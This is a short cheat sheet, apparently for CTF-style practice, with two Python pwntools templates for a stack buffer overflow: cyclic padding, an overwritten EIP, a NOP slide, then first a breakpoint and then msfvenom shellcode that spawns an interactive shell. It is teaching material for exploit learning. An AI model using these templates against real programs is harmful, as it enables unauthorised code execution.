# Test Shellcode With Breakpoint First

```python
#file name = pwn_<binary name>.py
#Run:
# 	python pwn_<binary name>.py > attack
# 	than input "attack" in to the binary

padding = cyclic(cyclic_find(<eip pattren>))

eip = p32(<Stack Pointer Address + N(offset)>)

nop_slide = "\x90"*<n>

# Before we write our shellcode, we can inject a 
# breakpoint at the end of our NOP slide to make sure 
# the slide works. The breakpoint instruction in hex 
# is "0xcc", and so we can add the following to our 
# code:
shellcode = "\xcc" 

payload = padding + eip + nop_slide + shellcode

print(payload)
```
<br>

# Exploit Binary With Real Shellcode
```python
#file name = pwn_<binary name>.py

padding = cyclic(cyclic_find(<eip pattren>))

eip = p32(<Stack Pointer Address + N(offset)>)

nop_slide = "\x90"*<n>

# Use msfvenom or shellcraft cli tool make shell code
shellcode = <payload>

payload = padding + eip + nop_slide + shellcode

# For a local process, we use the process() function. 
# Else use network connection
proc = process('<./binary name>')

proc.recvline() # See note 1

# send payload after reciving prompt
proc.send(payload)

# Communicate with the shell we have just spawned
proc.interactive()
```
<br>

# Notes:
1. We can receive data from the process, and since the process sends data with a new line, we can use recvline(), rather than recvn().

